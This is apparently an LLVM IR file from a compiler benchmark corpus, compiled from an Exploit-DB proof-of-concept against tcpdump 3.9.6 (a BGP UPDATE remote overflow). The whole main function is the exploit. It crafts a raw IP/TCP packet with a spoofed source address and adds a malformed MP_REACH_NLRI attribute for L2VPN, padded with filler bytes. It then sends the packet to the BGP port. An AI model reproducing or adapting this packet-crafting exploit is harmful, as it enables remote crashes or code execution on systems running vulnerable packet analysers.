; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_30319.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_30319.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.ip = type { i32, i32, i32, i32, i64, %struct.TYPE_5__, %struct.TYPE_4__, i64, i8*, i8*, i64 }
%struct.TYPE_5__ = type { i8* }
%struct.TYPE_4__ = type { i8* }
%struct.tcphdr = type { i32, i64, i64, i8*, i32, i64, i64, i32, i8*, i8* }
%struct.sockaddr_in = type { %struct.TYPE_6__, i8*, i32 }
%struct.TYPE_6__ = type { i8* }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [130 x i8] c"tcpdump <= 3.9.6 BGP UPDATE remote overflow POC\0Aby mu-b <mu-b@digit-labs.org>\0Ahttp://www.digit-labs.org/ -- Digit-Labs 2007!@$!\0A\0A\00", align 1
@PF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [10 x i8] c"socket ()\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [14 x i8] c"setsockopt ()\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@PORT_BGP = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [10 x i8] c"127.0.0.1\00", align 1
@PKT_LEN = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [8 x i8] c"1.2.3.4\00", align 1
@TH_PUSH = common dso_local global i32 0, align 4
@BGPTYPE_MP_REACH_NLRI = common dso_local global i32 0, align 4
@AFNUM_L2VPN = common dso_local global i32 0, align 4
@SAFNUM_VPNUNICAST = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [10 x i8] c"sendto ()\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  %7 = alloca %struct.ip*, align 8
  %8 = alloca %struct.tcphdr*, align 8
  %9 = alloca %struct.sockaddr_in, align 8
  store i32 0, i32* %1, align 4
  %10 = call i32 @printf(i8* getelementptr inbounds ([130 x i8], [130 x i8]* @.str, i64 0, i64 0))
  %11 = load i32, i32* @PF_INET, align 4
  %12 = load i32, i32* @SOCK_RAW, align 4
  %13 = load i32, i32* @IPPROTO_TCP, align 4
  %14 = call i32 @socket(i32 %11, i32 %12, i32 %13)
  store i32 %14, i32* %2, align 4
  %15 = icmp slt i32 %14, 0
  br i1 %15, label %16, label %20

16:                                               ; preds = %0
  %17 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0))
  %18 = load i32, i32* @EXIT_FAILURE, align 4
  %19 = call i32 @exit(i32 %18) #3
  unreachable

20:                                               ; preds = %0
  store i32 1, i32* %3, align 4
  store i32* %3, i32** %4, align 8
  %21 = load i32, i32* %2, align 4
  %22 = load i32, i32* @IPPROTO_IP, align 4
  %23 = load i32, i32* @IP_HDRINCL, align 4
  %24 = load i32*, i32** %4, align 8
  %25 = call i64 @setsockopt(i32 %21, i32 %22, i32 %23, i32* %24, i32 4)
  %26 = icmp slt i64 %25, 0
  br i1 %26, label %27, label %31

27:                                               ; preds = %20
  %28 = call i32 @perror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0))
  %29 = load i32, i32* @EXIT_FAILURE, align 4
  %30 = call i32 @exit(i32 %29) #3
  unreachable

31:                                               ; preds = %20
  %32 = load i32, i32* @AF_INET, align 4
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  store i32 %32, i32* %33, align 8
  %34 = load i32, i32* @PORT_BGP, align 4
  %35 = call i8* @htons(i32 %34)
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i8* %35, i8** %36, align 8
  %37 = call i8* @inet_addr(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %39 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %38, i32 0, i32 0
  store i8* %37, i8** %39, align 8
  %40 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %41 = call i32 @memset(i8* %40, i32 0, i32 4096)
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %43 = bitcast i8* %42 to %struct.ip*
  store %struct.ip* %43, %struct.ip** %7, align 8
  %44 = load %struct.ip*, %struct.ip** %7, align 8
  %45 = getelementptr inbounds %struct.ip, %struct.ip* %44, i32 0, i32 0
  store i32 5, i32* %45, align 8
  %46 = load %struct.ip*, %struct.ip** %7, align 8
  %47 = getelementptr inbounds %struct.ip, %struct.ip* %46, i32 0, i32 1
  store i32 4, i32* %47, align 4
  %48 = load %struct.ip*, %struct.ip** %7, align 8
  %49 = getelementptr inbounds %struct.ip, %struct.ip* %48, i32 0, i32 10
  store i64 0, i64* %49, align 8
  %50 = load i32, i32* @PKT_LEN, align 4
  %51 = sext i32 %50 to i64
  %52 = add i64 152, %51
  %53 = trunc i64 %52 to i32
  %54 = call i8* @htons(i32 %53)
  %55 = load %struct.ip*, %struct.ip** %7, align 8
  %56 = getelementptr inbounds %struct.ip, %struct.ip* %55, i32 0, i32 9
  store i8* %54, i8** %56, align 8
  %57 = call i8* @htonl(i32 54321)
  %58 = load %struct.ip*, %struct.ip** %7, align 8
  %59 = getelementptr inbounds %struct.ip, %struct.ip* %58, i32 0, i32 8
  store i8* %57, i8** %59, align 8
  %60 = load %struct.ip*, %struct.ip** %7, align 8
  %61 = getelementptr inbounds %struct.ip, %struct.ip* %60, i32 0, i32 7
  store i64 0, i64* %61, align 8
  %62 = load %struct.ip*, %struct.ip** %7, align 8
  %63 = getelementptr inbounds %struct.ip, %struct.ip* %62, i32 0, i32 2
  store i32 255, i32* %63, align 8
  %64 = load %struct.ip*, %struct.ip** %7, align 8
  %65 = getelementptr inbounds %struct.ip, %struct.ip* %64, i32 0, i32 3
  store i32 6, i32* %65, align 4
  %66 = load %struct.ip*, %struct.ip** %7, align 8
  %67 = getelementptr inbounds %struct.ip, %struct.ip* %66, i32 0, i32 4
  store i64 0, i64* %67, align 8
  %68 = call i8* @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0))
  %69 = load %struct.ip*, %struct.ip** %7, align 8
  %70 = getelementptr inbounds %struct.ip, %struct.ip* %69, i32 0, i32 6
  %71 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %70, i32 0, i32 0
  store i8* %68, i8** %71, align 8
  %72 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %73 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %72, i32 0, i32 0
  %74 = load i8*, i8** %73, align 8
  %75 = load %struct.ip*, %struct.ip** %7, align 8
  %76 = getelementptr inbounds %struct.ip, %struct.ip* %75, i32 0, i32 5
  %77 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %76, i32 0, i32 0
  store i8* %74, i8** %77, align 8
  %78 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %79 = bitcast i8* %78 to i16*
  %80 = call i64 @ip_sum(i16* %79, i32 72)
  %81 = load %struct.ip*, %struct.ip** %7, align 8
  %82 = getelementptr inbounds %struct.ip, %struct.ip* %81, i32 0, i32 4
  store i64 %80, i64* %82, align 8
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %84 = getelementptr inbounds i8, i8* %83, i64 72
  %85 = bitcast i8* %84 to %struct.tcphdr*
  store %struct.tcphdr* %85, %struct.tcphdr** %8, align 8
  %86 = call i8* @htons(i32 65535)
  %87 = load %struct.tcphdr*, %struct.tcphdr** %8, align 8
  %88 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %87, i32 0, i32 9
  store i8* %86, i8** %88, align 8
  %89 = load i32, i32* @PORT_BGP, align 4
  %90 = call i8* @htons(i32 %89)
  %91 = load %struct.tcphdr*, %struct.tcphdr** %8, align 8
  %92 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %91, i32 0, i32 8
  store i8* %90, i8** %92, align 8
  %93 = call i32 (...) @rand()
  %94 = load %struct.tcphdr*, %struct.tcphdr** %8, align 8
  %95 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %94, i32 0, i32 7
  store i32 %93, i32* %95, align 8
  %96 = load %struct.tcphdr*, %struct.tcphdr** %8, align 8
  %97 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %96, i32 0, i32 6
  store i64 0, i64* %97, align 8
  %98 = load %struct.tcphdr*, %struct.tcphdr** %8, align 8
  %99 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %98, i32 0, i32 5
  store i64 0, i64* %99, align 8
  %100 = load %struct.tcphdr*, %struct.tcphdr** %8, align 8
  %101 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %100, i32 0, i32 0
  store i32 20, i32* %101, align 8
  %102 = load i32, i32* @TH_PUSH, align 4
  %103 = load %struct.tcphdr*, %struct.tcphdr** %8, align 8
  %104 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %103, i32 0, i32 4
  store i32 %102, i32* %104, align 8
  %105 = call i8* @htonl(i32 65535)
  %106 = load %struct.tcphdr*, %struct.tcphdr** %8, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 3
  store i8* %105, i8** %107, align 8
  %108 = load %struct.tcphdr*, %struct.tcphdr** %8, align 8
  %109 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %108, i32 0, i32 2
  store i64 0, i64* %109, align 8
  %110 = load %struct.tcphdr*, %struct.tcphdr** %8, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 1
  store i64 0, i64* %111, align 8
  %112 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %113 = getelementptr inbounds i8, i8* %112, i64 72
  %114 = getelementptr inbounds i8, i8* %113, i64 80
  store i8* %114, i8** %6, align 8
  %115 = load i8*, i8** %6, align 8
  %116 = call i32 @memset(i8* %115, i32 255, i32 16)
  %117 = load i8*, i8** %6, align 8
  %118 = getelementptr inbounds i8, i8* %117, i64 16
  store i8* %118, i8** %6, align 8
  %119 = load i8*, i8** %6, align 8
  %120 = getelementptr inbounds i8, i8* %119, i32 1
  store i8* %120, i8** %6, align 8
  store i8 2, i8* %119, align 1
  %121 = load i8*, i8** %6, align 8
  %122 = getelementptr inbounds i8, i8* %121, i32 1
  store i8* %122, i8** %6, align 8
  store i8 0, i8* %121, align 1
  %123 = load i8*, i8** %6, align 8
  %124 = getelementptr inbounds i8, i8* %123, i32 1
  store i8* %124, i8** %6, align 8
  store i8 2, i8* %123, align 1
  %125 = load i8*, i8** %6, align 8
  %126 = getelementptr inbounds i8, i8* %125, i32 1
  store i8* %126, i8** %6, align 8
  store i8 0, i8* %125, align 1
  %127 = load i8*, i8** %6, align 8
  %128 = getelementptr inbounds i8, i8* %127, i32 1
  store i8* %128, i8** %6, align 8
  store i8 0, i8* %127, align 1
  %129 = load i8*, i8** %6, align 8
  %130 = getelementptr inbounds i8, i8* %129, i32 1
  store i8* %130, i8** %6, align 8
  store i8 0, i8* %129, align 1
  %131 = load i8*, i8** %6, align 8
  %132 = getelementptr inbounds i8, i8* %131, i32 1
  store i8* %132, i8** %6, align 8
  store i8 -1, i8* %131, align 1
  %133 = load i8*, i8** %6, align 8
  %134 = getelementptr inbounds i8, i8* %133, i32 1
  store i8* %134, i8** %6, align 8
  store i8 0, i8* %133, align 1
  %135 = load i32, i32* @BGPTYPE_MP_REACH_NLRI, align 4
  %136 = trunc i32 %135 to i8
  %137 = load i8*, i8** %6, align 8
  %138 = getelementptr inbounds i8, i8* %137, i32 1
  store i8* %138, i8** %6, align 8
  store i8 %136, i8* %137, align 1
  %139 = load i8*, i8** %6, align 8
  %140 = getelementptr inbounds i8, i8* %139, i32 1
  store i8* %140, i8** %6, align 8
  store i8 -1, i8* %139, align 1
  %141 = load i32, i32* @AFNUM_L2VPN, align 4
  %142 = shl i32 %141, 8
  %143 = and i32 %142, 255
  %144 = trunc i32 %143 to i8
  %145 = load i8*, i8** %6, align 8
  %146 = getelementptr inbounds i8, i8* %145, i32 1
  store i8* %146, i8** %6, align 8
  store i8 %144, i8* %145, align 1
  %147 = load i32, i32* @AFNUM_L2VPN, align 4
  %148 = and i32 %147, 255
  %149 = trunc i32 %148 to i8
  %150 = load i8*, i8** %6, align 8
  %151 = getelementptr inbounds i8, i8* %150, i32 1
  store i8* %151, i8** %6, align 8
  store i8 %149, i8* %150, align 1
  %152 = load i32, i32* @SAFNUM_VPNUNICAST, align 4
  %153 = trunc i32 %152 to i8
  %154 = load i8*, i8** %6, align 8
  %155 = getelementptr inbounds i8, i8* %154, i32 1
  store i8* %155, i8** %6, align 8
  store i8 %153, i8* %154, align 1
  %156 = load i8*, i8** %6, align 8
  %157 = getelementptr inbounds i8, i8* %156, i32 1
  store i8* %157, i8** %6, align 8
  store i8 0, i8* %156, align 1
  %158 = load i8*, i8** %6, align 8
  %159 = getelementptr inbounds i8, i8* %158, i32 1
  store i8* %159, i8** %6, align 8
  store i8 0, i8* %158, align 1
  %160 = load i8*, i8** %6, align 8
  %161 = getelementptr inbounds i8, i8* %160, i32 1
  store i8* %161, i8** %6, align 8
  store i8 -1, i8* %160, align 1
  %162 = load i8*, i8** %6, align 8
  %163 = getelementptr inbounds i8, i8* %162, i32 1
  store i8* %163, i8** %6, align 8
  store i8 -1, i8* %162, align 1
  %164 = load i8*, i8** %6, align 8
  %165 = call i32 @memset(i8* %164, i32 255, i32 15)
  %166 = load i8*, i8** %6, align 8
  %167 = getelementptr inbounds i8, i8* %166, i64 15
  store i8* %167, i8** %6, align 8
  %168 = load i8*, i8** %6, align 8
  %169 = getelementptr inbounds i8, i8* %168, i32 1
  store i8* %169, i8** %6, align 8
  store i8 1, i8* %168, align 1
  %170 = load i8*, i8** %6, align 8
  %171 = getelementptr inbounds i8, i8* %170, i32 1
  store i8* %171, i8** %6, align 8
  store i8 2, i8* %170, align 1
  %172 = load i8*, i8** %6, align 8
  %173 = getelementptr inbounds i8, i8* %172, i32 1
  store i8* %173, i8** %6, align 8
  store i8 80, i8* %172, align 1
  %174 = load i8*, i8** %6, align 8
  %175 = load i32, i32* @PKT_LEN, align 4
  %176 = call i32 @memset(i8* %174, i32 65, i32 %175)
  %177 = load i32, i32* %2, align 4
  %178 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %179 = load i32, i32* @PKT_LEN, align 4
  %180 = sext i32 %179 to i64
  %181 = add i64 152, %180
  %182 = trunc i64 %181 to i32
  %183 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %184 = call i64 @sendto(i32 %177, i8* %178, i32 %182, i32 0, %struct.sockaddr* %183, i32 24)
  %185 = icmp slt i64 %184, 0
  br i1 %185, label %186, label %190

186:                                              ; preds = %31
  %187 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0))
  %188 = load i32, i32* @EXIT_FAILURE, align 4
  %189 = call i32 @exit(i32 %188) #3
  unreachable

190:                                              ; preds = %31
  %191 = load i32, i32* @EXIT_SUCCESS, align 4
  ret i32 %191
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @setsockopt(i32, i32, i32, i32*, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i8* @inet_addr(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i8* @htonl(i32) #1

declare dso_local i64 @ip_sum(i16*, i32) #1

declare dso_local i32 @rand(...) #1

declare dso_local i64 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
